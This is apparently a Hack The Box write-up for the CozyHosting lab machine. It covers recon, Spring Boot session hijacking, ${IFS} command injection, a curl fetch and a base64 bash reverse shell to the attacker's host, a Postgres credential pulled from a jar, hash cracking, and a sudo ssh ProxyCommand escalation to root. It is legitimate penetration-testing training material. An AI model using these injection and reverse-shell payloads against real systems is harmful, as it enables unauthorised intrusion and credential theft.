---
title: "CozyHosting - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## CozyHosting
![](https://kar0nx.github.io/assets/images/writeup/eaed7cd01e84ef5c6ec7d949d1d61110.png)
## Reconnaissance

IP: 10.10.11.230
## NMAP

```
nmap -T4 -p- -A 10.10.11.230
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 11:47 UTC
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   29.67 ms 10.10.14.1
2   29.95 ms cozyhosting.htb (10.10.11.230)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds

```

Add cozyhosting.htb to /etc/hosts and we starting enumeration with http

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831134825.png)

/login panel

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831134916.png)

inspecting site we can spot comment 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831135130.png)

FFUF found /error page but it returns status 500 not 404

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831135819.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831135735.png)

Searching google for that error I found that this is default error page displayed by Spring Boot, so our target using it.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831135857.png)

found wordlists for Spring Boot 
https://git.selfmade.ninja/zer0sec/SecLists/-/blob/eee1651de7906112719066540ca2c5bf688cf9f2/Discovery/Web-Content/spring-boot.txt
and used ffuf again

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831140544.png)

Checking this directories I found probably nickname kanderson in /sessions 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831140852.png)

in /mapping I found something interresting

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831141322.png)

Tried to login with kanderson but no luck, maybe session stealing

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831142312.png)

and after navigating do /admin we are login as K. Anderson

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831143007.png)

no we see this executeoverssh which seen in mapping, start by trying command injection

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831143233.png)

I spot that this is using 
ssh -i 'key' 'command'

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831143458.png)

so let's create simple bash reverse shell
```
bash -i >& /dev/tcp/10.10.14.8/4444 0>&1
```

Download it via injection

```
karol;curl${IFS}http://10.10.14.8/rev.sh${IFS}-o${IFS}/tmp/rev.sh
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831143925.png)

```
karol;bash${IFS}/tmp/rev.sh
```

tried few times change to url encoding but I cannot run rev.sh, so I switched to oneliner base64 encoded

```
karol%3b`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQo=|base64${IFS}-d|bash`
```

and I got shell

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831144728.png)

## Gaining Access

spotted .jar file in current directory so imminently download it on my kali machine 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831144932.png)

```
wget http://10.10.11.230:1337/cloudhosting-0.0.1.jar
```

Now unzip jar file and search for passwords. I found postgres password Vg&nvzAQ7XxR

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831150852.png)

I was able to login to postgres via psql on target machine and extract users and hashes

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831151511.png)

Cracked password via hashcat

```
hashcat hash /usr/share/wordlists/rockyou.txt -m 3200
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831151649.png)

Now I log in to ssh josh user with above password

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831151754.png)

## Privilege Escalation

Starting with sudo -l I found that josh can run sudo with ssh, quick check in GTFO bins, run command and we have root shell
https://gtfobins.github.io/gtfobins/ssh/

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831152024.png)